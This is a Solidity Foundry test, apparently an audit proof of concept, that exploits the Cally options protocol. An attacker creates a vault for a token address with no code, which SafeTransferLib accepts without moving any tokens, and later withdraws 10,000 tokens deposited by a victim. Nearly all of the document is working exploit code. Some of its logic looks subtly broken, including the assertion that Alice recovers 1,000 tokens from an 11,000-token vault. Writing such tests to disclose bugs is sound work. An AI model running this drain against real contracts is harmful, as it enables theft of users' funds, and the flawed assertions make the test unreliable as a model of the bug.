// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

/**
 * @title Token Address Precomputation Attack PoC
 * @notice This PoC demonstrates how an attacker can exploit the lack of code existence
 *         checks in Solmate's SafeTransferLib to create "fake" vaults for tokens that
 *         don't exist yet on the current chain but will be deployed at known addresses.
 * 
 * Attack Flow:
 * 1. Attacker identifies token addresses that exist on other chains (e.g., TokenB on Ethereum)
 * 2. Attacker creates vaults for these non-existent token addresses on current chain (e.g., Arbitrum)
 * 3. SafeTransferLib doesn't check for code existence, so the call succeeds without transferring tokens
 * 4. Protocol records the vault as containing tokens, but no actual tokens were deposited
 * 5. When the token is eventually deployed at that address on the current chain
 * 6. Legitimate users deposit real tokens into new vaults
 * 7. Attacker withdraws their "fake" vault, receiving real tokens they never deposited
 */
contract ExploitTest is Test {
    Cally public cally;
    MockERC20 public tokenB;
    
    address public attacker = address(0x1337);
    address public alice = address(0xA11CE);
    
    // This is the address where TokenB will be deployed
    // In reality, this would be a known address from another chain
    address public constant FUTURE_TOKEN_ADDRESS = address(0xBBBB);
    
    function setUp() public {
        // Deploy Cally protocol
        cally = new Cally();
        
        // Fund attacker and alice with ETH for gas
        vm.deal(attacker, 100 ether);
        vm.deal(alice, 100 ether);
    }
    
    /**
     * @notice Main exploit test demonstrating the token address precomputation attack
     * @dev This test shows how an attacker can:
     *      1. Create a vault for a non-existent token (no code at address)
     *      2. Wait for the token to be deployed at that address
     *      3. Steal tokens from legitimate users who deposit after deployment
     */
    function testTokenAddressPrecomputationAttack() public {
        // ============================================================
        // PHASE 1: TRAP SETTING - Attacker creates vault for non-existent token
        // ============================================================
        
        vm.startPrank(attacker);
        
        // Verify that FUTURE_TOKEN_ADDRESS has no code yet
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(FUTURE_TOKEN_ADDRESS)
        }
        assertEq(codeSize, 0, "Token should not exist yet");
        
        // Attacker creates a vault claiming to deposit 10,000 tokens
        // This should fail if proper checks were in place, but succeeds due to SafeTransferLib
        uint256 attackerVaultId = cally.createVault(
            10000e18,                    // tokenIdOrAmount - claiming 10k tokens
            FUTURE_TOKEN_ADDRESS,        // token address (NO CODE HERE!)
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0.5 ether,                   // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );
        
        // Verify vault was created successfully
        assertEq(attackerVaultId, 3, "Attacker vault should be created with ID 3");
        assertEq(cally.ownerOf(attackerVaultId), attacker, "Attacker should own the vault");
        
        // Verify vault state - protocol thinks attacker deposited 10k tokens
        Cally.Vault memory attackerVault = cally.vaults(attackerVaultId);
        assertEq(attackerVault.tokenIdOrAmount, 10000e18, "Vault should record 10k tokens");
        assertEq(attackerVault.token, FUTURE_TOKEN_ADDRESS, "Vault should reference future token");
        
        vm.stopPrank();
        
        // ============================================================
        // PHASE 2: TOKEN DEPLOYMENT - Token gets deployed at the known address
        // ============================================================
        
        // Simulate token deployment at the predetermined address
        // In reality, this would be done by the token project deploying on the new chain
        vm.etch(FUTURE_TOKEN_ADDRESS, type(MockERC20).runtimeCode);
        tokenB = MockERC20(FUTURE_TOKEN_ADDRESS);
        
        // Initialize the token (simulating constructor)
        tokenB.initialize("TokenB", "TKNB", 18);
        
        // Verify token now exists at the address
        assembly {
            codeSize := extcodesize(FUTURE_TOKEN_ADDRESS)
        }
        assertGt(codeSize, 0, "Token should now exist");
        
        // ============================================================
        // PHASE 3: VICTIM INTERACTION - Alice deposits real tokens
        // ============================================================
        
        vm.startPrank(alice);
        
        // Mint tokens to Alice
        tokenB.mint(alice, 11000e18);
        assertEq(tokenB.balanceOf(alice), 11000e18, "Alice should have 11k tokens");
        
        // Alice approves Cally to spend her tokens
        tokenB.approve(address(cally), 11000e18);
        
        // Alice creates a legitimate vault with REAL tokens
        uint256 aliceVaultId = cally.createVault(
            11000e18,                    // tokenIdOrAmount - Alice deposits 11k REAL tokens
            FUTURE_TOKEN_ADDRESS,        // token address (NOW HAS CODE!)
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0.5 ether,                   // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );
        
        // Verify Alice's tokens were actually transferred
        assertEq(tokenB.balanceOf(alice), 0, "Alice's tokens should be transferred");
        assertEq(tokenB.balanceOf(address(cally)), 11000e18, "Cally should hold Alice's 11k tokens");
        
        vm.stopPrank();
        
        // ============================================================
        // PHASE 4: EXPLOITATION - Attacker withdraws "fake" vault
        // ============================================================
        
        vm.startPrank(attacker);
        
        // Attacker initiates withdrawal on their vault
        cally.initiateWithdraw(attackerVaultId);
        
        // Verify vault is in withdrawing state
        Cally.Vault memory vaultAfterInitiate = cally.vaults(attackerVaultId);
        assertTrue(vaultAfterInitiate.isWithdrawing, "Vault should be in withdrawing state");
        
        // Fast forward time past the current expiration
        vm.warp(block.timestamp + 2 days);
        
        // Record balances before withdrawal
        uint256 attackerBalanceBefore = tokenB.balanceOf(attacker);
        uint256 callyBalanceBefore = tokenB.balanceOf(address(cally));
        
        assertEq(attackerBalanceBefore, 0, "Attacker should have 0 tokens before withdrawal");
        assertEq(callyBalanceBefore, 11000e18, "Cally should have 11k tokens (Alice's deposit)");
        
        // Attacker withdraws their vault
        cally.withdraw(attackerVaultId);
        
        // Record balances after withdrawal
        uint256 attackerBalanceAfter = tokenB.balanceOf(attacker);
        uint256 callyBalanceAfter = tokenB.balanceOf(address(cally));
        
        vm.stopPrank();
        
        // ============================================================
        // VERIFICATION - Demonstrate the exploit succeeded
        // ============================================================
        
        // Attacker received 10k tokens they NEVER deposited
        assertEq(attackerBalanceAfter, 10000e18, "Attacker stole 10k tokens");
        
        // Only 1k tokens remain in the contract (should be 11k)
        assertEq(callyBalanceAfter, 1000e18, "Only 1k tokens remain in contract");
        
        // Alice's vault is now under-collateralized
        // If Alice tries to withdraw, she will only get 1k tokens instead of 11k
        vm.startPrank(alice);
        cally.initiateWithdraw(aliceVaultId);
        vm.warp(block.timestamp + 2 days);
        
        uint256 aliceBalanceBefore = tokenB.balanceOf(alice);
        cally.withdraw(aliceVaultId);
        uint256 aliceBalanceAfter = tokenB.balanceOf(alice);
        
        // Alice only recovers 1k tokens instead of her 11k deposit
        assertEq(aliceBalanceAfter - aliceBalanceBefore, 1000e18, "Alice only recovers 1k tokens");
        
        vm.stopPrank();
        
        // ============================================================
        // IMPACT SUMMARY
        // ============================================================
        
        // Attacker profit: 10,000 tokens (never deposited anything)
        // Alice loss: 10,000 tokens (deposited 11k, recovered 1k)
        // Protocol insolvency: Contract recorded 21k tokens but only held 11k
        
        emit log_named_uint("Attacker profit (tokens)", attackerBalanceAfter);
        emit log_named_uint("Alice loss (tokens)", 11000e18 - (aliceBalanceAfter - aliceBalanceBefore));
        emit log_named_string("Attack vector", "Token address precomputation with SafeTransferLib");
    }
}

/**
 * @notice Mock ERC20 token for testing
 * @dev Simplified ERC20 implementation with mint function
 */
contract MockERC20 is ERC20 {
    bool private initialized;
    
    constructor() ERC20("", "", 18) {}
    
    function initialize(string memory _name, string memory _symbol, uint8 _decimals) external {
        require(!initialized, "Already initialized");
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        initialized = true;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
